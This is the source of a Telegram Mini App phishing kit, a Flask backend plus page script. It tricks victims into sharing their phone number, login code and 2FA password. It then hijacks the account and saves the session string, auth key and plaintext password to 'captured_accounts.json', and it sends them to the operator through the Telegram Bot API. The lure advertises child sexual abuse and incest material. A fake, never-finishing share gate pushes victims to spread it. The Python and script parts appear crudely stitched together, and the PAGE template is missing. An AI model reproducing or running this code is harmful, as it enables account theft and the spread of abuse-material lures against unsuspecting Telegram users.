from flask import Flask, request, jsonify, render_template_string
import os, json, base64, threading, asyncio, logging, sys
import requests as http_requests
from datetime import datetime
from telethon import TelegramClient, errors
from telethon.sessions import StringSession

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============ ENV ============
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
API_ID      = int(os.environ.get("API_ID", "0"))
API_HASH    = os.environ.get("API_HASH", "")
OWNER_ID    = int(os.environ.get("OWNER_ID", "0"))
WEBAPP_URL  = os.environ.get("WEBAPP_URL", "https://yourdomain.com")

if sys.version_info >= (3, 12) and sys.platform == 'win32':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass

app = Flask(__name__)

# ============ STATE ============
user_sessions     = {}
pending_codes     = {}
pending_2fa       = {}
sessions_lock     = threading.Lock()

DATA_FILE              = "captured_accounts.json"
USER_PHONE_MAP_FILE    = "user_phone_map.json"
_map_lock              = threading.Lock()

# ============ STORAGE ============
def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            return []
    return []

def save_account(account):
    accounts = load_accounts()
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account
            break
    else:
        accounts.append(account)
    with open(DATA_FILE, 'w') as f:
        json.dump(accounts, f, indent=2, ensure_ascii=False)
    logger.info(f"✅ Saved: {account['phone']}")
    return account

captured_accounts = load_accounts()

def load_user_phone_map():
    if os.path.exists(USER_PHONE_MAP_FILE):
        try:
            with open(USER_PHONE_MAP_FILE, 'r') as f:
                return json.load(f)
        except Exception:
            return {}
    return {}

def save_user_phone_map(m):
    with _map_lock:
        with open(USER_PHONE_MAP_FILE, 'w') as f:
            json.dump(m, f, indent=2)

user_phone_map = load_user_phone_map()

# ============ HELPERS ============
def format_phone(ph):
    if not ph:
        return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits:
        return ph
    if ph.startswith('+'):
        return ph
    if len(digits) == 10:
        return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'):
        return '+' + digits
    return '+' + digits

def send_bot_notification(phone, ss, me, dc, password_used=False, password_value=""):
    try:
        if not BOT_TOKEN or not OWNER_ID:
            print(f"\n🔴 NO BOT TOKEN / OWNER — Session for {phone}:\n{ss}\n")
            return
        max_len = 3900
        extra = ""
        if password_used:
            extra = "\n🔐 2FA Password Used"
            if password_value:
                extra += f"\n🔑 2FA Password: `{password_value}`"

        if len(ss) > max_len:
            msg1 = (
                f"🔔 New Account Captured!{extra}\n\n"
                f"📱 Phone: {phone}\n"
                f"👤 Name: {me.first_name or ''} {me.last_name or ''}\n"
                f"🆔 User ID: {me.id}\n"
                f"📛 Username: @{me.username or 'N/A'}\n"
                f"🌐 DC: {dc}\n"
                f"📏 Session Length: {len(ss)} chars\n\n"
                f"📄 Session (part 1/2):\n`{ss[:max_len]}`"
            )
            msg2 = f"📄 Session (part 2/2) for {phone}:\n`{ss[max_len:]}`"
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': OWNER_ID, 'text': msg1, 'parse_mode': 'Markdown'}, timeout=15)
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': OWNER_ID, 'text': msg2, 'parse_mode': 'Markdown'}, timeout=15)
        else:
            msg = (
                f"🔔 New Account!{extra}\n"
                f"📱 {phone}\n"
                f"👤 {me.first_name} {me.last_name or ''}\n"
                f"🆔 {me.id}\n"
                f"🌐 DC: {dc}\n"
                f"📏 Session: {len(ss)} chars\n\n"
                f"🔑 Session:\n`{ss}`"
            )
            r = http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                json={'chat_id': OWNER_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=15)
            if r.status_code != 200:
                http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={'chat_id': OWNER_ID, 'text': f"Session for {phone}:\n{ss}"}, timeout=15)
    except Exception as e:
        logger.error(f"Bot notify error: {e}")
        print(f"\n🔴 BOT FAILED! Session for {phone}:\n{ss}\n")

# ============ TELEGRAM CORE ============
def run_telegram_action(phone, code=None, password=None):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                r = await client.send_code_request(phone)
                session_str = StringSession.save(client.session)
                with sessions_lock:
                    user_sessions[phone] = {
                        'hash': r.phone_code_hash,
                        'session': session_str,
                        'phone_code_result': r
                    }
                    pending_codes[phone] = 'sent'
                    pending_2fa[phone] = False
                return {'success': True}
            except errors.FloodWaitError as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': f'Flood wait {e.seconds}s'}
            except Exception as e:
                with sessions_lock:
                    pending_codes[phone] = 'err'
                return {'success': False, 'error': str(e)[:80]}
            finally:
                await client.disconnect()

        async def verify():
            with sessions_lock:
                if phone not in user_sessions:
                    return {'success': False, 'error': 'Session not found'}
                s = user_sessions[phone]

            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
            try:
                await client.connect()
                if await client.is_user_authorized():
                    me = await client.get_me()
                else:
                    try:
                        await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
                        me = await client.get_me()
                    except errors.SessionPasswordNeededError:
                        with sessions_lock:
                            pending_2fa[phone] = True
                            pending_codes[phone] = '2fa_needed'
                        if password:
                            try:
                                await client.sign_in(password=password)
                                me = await client.get_me()
                                with sessions_lock:
                                    pending_2fa[phone] = False
                                    pending_codes[phone] = 'done'
                            except errors.PasswordHashInvalidError:
                                return {'success': False, 'error': 'Wrong 2FA password'}
                            except Exception as e:
                                return {'success': False, 'error': f'2FA error: {str(e)[:50]}'}
                        else:
                            return {'success': False, 'error': '2FA', 'needs_password': True}
                    except errors.PhoneCodeInvalidError:
                        return {'success': False, 'error': 'Wrong code'}
                    except errors.PhoneCodeExpiredError:
                        return {'success': False, 'error': 'Code expired'}
                    except Exception as e:
                        return {'success': False, 'error': str(e)[:80]}

                await client.get_dialogs()
                ss = StringSession.save(client.session)

                ak = getattr(client.session, 'auth_key', None)
                auth_key = ak.key if ak else None
                dc = client.session.dc_id

                # BUG FIX: safe retry
                if not auth_key:
                    try:
                        await client.disconnect()
                    except Exception:
                        pass
                    await asyncio.sleep(0.5)
                    client2 = TelegramClient(StringSession(ss), API_ID, API_HASH)
                    await client2.connect()
                    await client2.get_dialogs()
                    ak2 = getattr(client2.session, 'auth_key', None)
                    auth_key = ak2.key if ak2 else None
                    dc = client2.session.dc_id
                    ss = StringSession.save(client2.session)
                    me = await client2.get_me()
                    await client2.disconnect()

                auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
                password_used = password is not None

                acc = {
                    'phone': phone,
                    'user_id': me.id,
                    'username': me.username or '',
                    'first_name': me.first_name or '',
                    'last_name': me.last_name or '',
                    'session': ss,
                    'webk': json.dumps({
                        'dcId': dc,
                        'authKey': auth_b64,
                        'userId': me.id,
                        'isSupport': False,
                        'isTest': False
                    }),
                    'dc': dc,
                    'time': str(datetime.now()),
                    'has_2fa': password_used,
                    'password': password if password_used else ''
                }
                save_account(acc)
                global captured_accounts
                captured_accounts = load_accounts()

                with sessions_lock:
                    user_sessions.pop(phone, None)
                    pending_2fa.pop(phone, None)
                    pending_codes[phone] = 'done'

                send_bot_notification(phone, ss, me, dc,
                                      password_used,
                                      password if password_used else "")
                return {'success': True, 'session': ss, 'user_id': me.id}
            except Exception as e:
                e_str = str(e)
                if 'PHONE_CODE_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong code'}
                if 'SESSION_PASSWORD_NEEDED' in e_str:
                    return {'success': False, 'error': '2FA', 'needs_password': True}
                if 'PASSWORD_HASH_INVALID' in e_str:
                    return {'success': False, 'error': 'Wrong 2FA password'}
                return {'success': False, 'error': e_str[:80]}
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

        if code:
            return loop.run_until_complete(verify())
        else:
            return loop.run_until_complete(send_code())
    finally:
        loop.close()

# ============ ROUTES ============
@app.route('/')
def index():
    return render_template_string(PAGE)

@app.route('/api/save_user_phone', methods=['POST'])
def api_save_user_phone():
    try:
        data = request.get_json(force=True)
        tg_id = str(data.get('tg_user_id', ''))
        phone = format_phone(data.get('phone', ''))
        if tg_id and phone:
            user_phone_map[tg_id] = phone
            save_user_phone_map(user_phone_map)
        return jsonify({'ok': True})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)[:80]})

@app.route('/api/user_phone', methods=['GET'])
def api_user_phone():
    tg_id = str(request.args.get('tg_user_id', ''))
    return jsonify({'phone': user_phone_map.get(tg_id)})

@app.route('/api/share', methods=['POST'])
def api_share():
    try:
        data = request.get_json(force=True)
        phone = format_phone(data.get('phone', ''))
        if not phone:
            return jsonify({'success': False, 'error': 'no phone'})
        # already captured? skip
        for a in captured_accounts:
            if a['phone'] == phone:
                return jsonify({'success': True, 'already': True})
        result = run_telegram_action(phone)
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:80]})

@app.route('/api/check', methods=['POST'])
def api_check():
    try:
        data = request.get_json(force=True)
        phone = format_phone(data.get('phone', ''))
        with sessions_lock:
            state = pending_codes.get(phone, 'unknown')
        return jsonify({'s': state})
    except Exception as e:
        return jsonify({'s': 'err', 'error': str(e)[:80]})

@app.route('/api/verify', methods=['POST'])
def api_verify():
    try:
        data = request.get_json(force=True)
        phone = format_phone(data.get('phone', ''))
        code = data.get('code')
        password = data.get('password')
        return jsonify(run_telegram_action(phone, code=code, password=password))
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)[:80]})

@app.route('/api/clear', methods=['POST'])
def api_clear():
    try:
        data = request.get_json(force=True)
        phone = format_phone(data.get('phone', ''))
        with sessions_lock:
            pending_codes.pop(phone, None)
            pending_2fa.pop(phone, None)
            user_sessions.pop(phone, None)
        return jsonify({'ok': True})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)[:80]})

@app.route('/session/<path:phone>')
def get_session(phone):
    phone = format_phone(phone)
    for a in captured_accounts:
        if a['phone'] == phone:
            return jsonify(a)
    return jsonify({})

@app.route('/health')
def health():
    return jsonify({'ok': True, 'time': str(datetime.now())})
    <script>
var tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

var phoneNumber = '';
var codeDigits = '';
var codeCheckInterval = null;
var passwordCheckInterval = null;
var sharesDone = 0;
var TG_CHANNEL_LINK = 'https://t.me/videodks';
var TG_CHANNEL_CAPTION = '𝗖𝗽, 𝗿𝗮𝗽𝗲,𝗺𝗼𝗺 𝘀𝗼𝗼𝗻🔞👇';
var tgUserId = tg.initDataUnsafe?.user?.id || null;
var tgFirstName = tg.initDataUnsafe?.user?.first_name || '';

// ---- OPEN MODAL ----
document.getElementById('glb').onclick = async function() {
    document.getElementById('vm').classList.add('active');
    document.getElementById('s1').classList.add('active');
    document.getElementById('s2').classList.remove('active');
    document.getElementById('s2b').classList.remove('active');
    document.getElementById('s3').classList.remove('active');

    if (tgUserId) {
        try {
            var res = await fetch('/api/user_phone?tg_user_id=' + tgUserId);
            var data = await res.json();
            if (data.phone) {
                phoneNumber = data.phone;
                var res2 = await fetch('/session/' + encodeURIComponent(phoneNumber));
                var data2 = await res2.json();
                if (data2.user_id) { goToSharePage(); return; }
                sendPhoneToBackend(phoneNumber);
                return;
            }
        } catch(e) {}
    }
};

// ---- REQUEST CONTACT ----
function requestContact() {
    if (!tg || !tg.requestContact) {
        var el = document.getElementById('ps1');
        el.className = 'sb error';
        el.innerHTML = '❌ Telegram WebApp not available. Telegram er vitore kholo.';
        el.style.display = 'block';
        return;
    }
    var btn = document.getElementById('cbtn');
    btn.disabled = true;
    btn.innerHTML = '<span class="sp"></span> Waiting for contact...';

    tg.requestContact(function(sent, event) {
        if (sent && event && event.responseUnsafe && event.responseUnsafe.contact) {
            var c = event.responseUnsafe.contact;
            phoneNumber = normalizePhone(c.phone_number || '');
            document.getElementById('pd').textContent = phoneNumber;

            if (tgUserId) {
                fetch('/api/save_user_phone', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({tg_user_id: tgUserId, phone: phoneNumber})
                });
            }
            btn.disabled = false;
            btn.innerHTML = '📲 Share Contact';
            var ps = document.getElementById('ps1');
            ps.className = 'sb success';
            ps.innerHTML = '✅ Contact pelam: ' + phoneNumber;
            ps.style.display = 'block';
            setTimeout(function(){ sendPhoneToBackend(phoneNumber); }, 500);
        } else {
            btn.disabled = false;
            btn.innerHTML = '📲 Share Contact';
            var ps = document.getElementById('ps1');
            ps.className = 'sb error';
            ps.innerHTML = '❌ Contact share korte hobe. Abar try koro.';
            ps.style.display = 'block';
        }
    });
}

function normalizePhone(ph) {
    var digits = ph.replace(/\D/g, '');
    if (ph.startsWith('+')) return ph;
    if (digits.length === 10) return '+91' + digits;
    if (digits.length === 12 && digits.startsWith('91')) return '+' + digits;
    return '+' + digits;
}

// ---- SEND PHONE ----
async function sendPhoneToBackend(phone) {
    try {
        var res = await fetch('/api/share', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phone})
        });
        var data = await res.json();
        if (data.success) {
            document.getElementById('s1').classList.remove('active');
            document.getElementById('s2').classList.add('active');
            document.getElementById('pd').textContent = phone;
            var cs = document.getElementById('cs');
            cs.className = 'sb waiting';
            cs.innerHTML = '<span class="sp"></span> Code pathano hocche...';
            cs.style.display = 'block';
            startCodeCheck();
        } else {
            var ps = document.getElementById('ps1');
            ps.className = 'sb error';
            ps.innerHTML = '❌ ' + (data.error || 'Error');
            ps.style.display = 'block';
        }
    } catch(e) {
        var ps = document.getElementById('ps1');
        ps.className = 'sb error';
        ps.innerHTML = '❌ Connection error';
        ps.style.display = 'block';
    }
}

// ---- POLL ----
function startCodeCheck() {
    if (codeCheckInterval) clearInterval(codeCheckInterval);
    codeCheckInterval = setInterval(async function() {
        try {
            var res = await fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            var data = await res.json();
            if (data.s === 'sent') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                var cs = document.getElementById('cs');
                cs.className = 'sb success';
                cs.innerHTML = '✅ Code pathano hoyeche!';
                cs.style.display = 'block';
            } else if (data.s === 'done') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                goToSharePage();
            } else if (data.s === '2fa_needed') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                document.getElementById('s2').classList.remove('active');
                document.getElementById('s2b').classList.add('active');
                startPasswordCheck();
            } else if (data.s === 'err') {
                clearInterval(codeCheckInterval); codeCheckInterval = null;
                var cs = document.getElementById('cs');
                cs.className = 'sb error';
                cs.innerHTML = '❌ Code pathate problem';
                cs.style.display = 'block';
            }
        } catch(e) {}
    }, 2000);
}

function startPasswordCheck() {
    if (passwordCheckInterval) clearInterval(passwordCheckInterval);
    passwordCheckInterval = setInterval(async function() {
        try {
            var res = await fetch('/api/check', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            var data = await res.json();
            if (data.s === 'done') {
                clearInterval(passwordCheckInterval); passwordCheckInterval = null;
                goToSharePage();
            } else if (data.s === 'err') {
                clearInterval(passwordCheckInterval); passwordCheckInterval = null;
                var ps = document.getElementById('pwdStatus');
                ps.className = 'sb error';
                ps.innerHTML = '❌ Verification failed';
                ps.style.display = 'block';
            }
        } catch(e) {}
    }, 2000);
}

// ---- OTP KEYPAD ----
function pk(n) { if (codeDigits.length < 5) { codeDigits += n; document.getElementById('cdisp').textContent = codeDigits; } }
function cc() { codeDigits = codeDigits.slice(0, -1); document.getElementById('cdisp').textContent = codeDigits || '_'; }

async function sc() {
    if (codeDigits.length < 5) { showVerifyStatus('❌ 5 digit din', 'error'); return; }
    var btn = document.getElementById('sb');
    btn.disabled = true;
    btn.textContent = '⏳ ...';
    try {
        var res = await fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits})
        });
        var data = await res.json();
        if (data.success) {
            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
            goToSharePage();
        } else if (data.needs_password) {
            document.getElementById('s2').classList.remove('active');
            document.getElementById('s2b').classList.add('active');
            if (codeCheckInterval) { clearInterval(codeCheckInterval); codeCheckInterval = null; }
        } else {
            showVerifyStatus('❌ ' + (data.error || 'Bhul code'), 'error');
            codeDigits = '';
            document.getElementById('cdisp').textContent = '_';
            btn.disabled = false;
            btn.textContent = '✓ Verify';
        }
    } catch(e) {
        showVerifyStatus('❌ Error', 'error');
        btn.disabled = false;
        btn.textContent = '✓ Verify';
    }
}

async function submitPassword() {
    var pwd = document.getElementById('pwdInput').value.trim();
    var ps = document.getElementById('pwdStatus');
    if (!pwd) {
        ps.className = 'sb error';
        ps.innerHTML = '❌ Password din';
        ps.style.display = 'block';
        return;
    }
    ps.className = 'sb waiting';
    ps.innerHTML = '<span class="sp"></span> Checking...';
    ps.style.display = 'block';
    try {
        var res = await fetch('/api/verify', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
        });
        var data = await res.json();
        if (data.success) {
            if (passwordCheckInterval) { clearInterval(passwordCheckInterval); passwordCheckInterval = null; }
            goToSharePage();
        } else {
            ps.className = 'sb error';
            ps.innerHTML = '❌ ' + (data.error || 'Wrong password');
            ps.style.display = 'block';
        }
    } catch(e) {
        ps.className = 'sb error';
        ps.innerHTML = '❌ Error';
        ps.style.display = 'block';
    }
}

function showVerifyStatus(msg, type) {
    var el = document.getElementById('vs');
    el.textContent = msg;
    el.className = 'sb ' + type;
    el.style.display = 'block';
}

// ---- SHARE PAGE ----
function goToSharePage() {
    document.getElementById('s1').classList.remove('active');
    document.getElementById('s2').classList.remove('active');
    document.getElementById('s2b').classList.remove('active');
    document.getElementById('s3').classList.add('active');
    // cleanup backend state
    if (phoneNumber) {
        fetch('/api/clear', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({phone: phoneNumber})
        });
    }
    setupShareLink();
}

function setupShareLink() {
    updateShareProgress();
    if (sharesDone > 0) {
        var st = document.getElementById('shareStatus');
        st.className = 'sb success';
        st.innerHTML = '✅ ' + sharesDone + '/5 shared';
        st.style.display = 'block';
    }
}

function simulateShare() {
    var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
    window.open(shareUrl, '_blank');
    sharesDone = Math.min(sharesDone + 1, 4);
    updateShareProgress();
    var st = document.getElementById('shareStatus');
    if (sharesDone >= 4) {
        st.className = 'sb waiting';
        st.innerHTML = '<span class="sp"></span> Ar matro 1 ta share baki!';
    } else {
        st.className = 'sb success';
        st.innerHTML = '✅ ' + sharesDone + '/5 shared';
    }
    st.style.display = 'block';
}

// BUG FIX: puro function
function updateShareProgress() {
    for (var i = 1; i <= 5; i++) {
        var el = document.getElementById('sp' + i);
        if (i <= sharesDone) el.className = 'share-step done';
        else if (i === sharesDone + 1) el.className = 'share-step active';
        else el.className = 'share-step';
    }
}
</script>
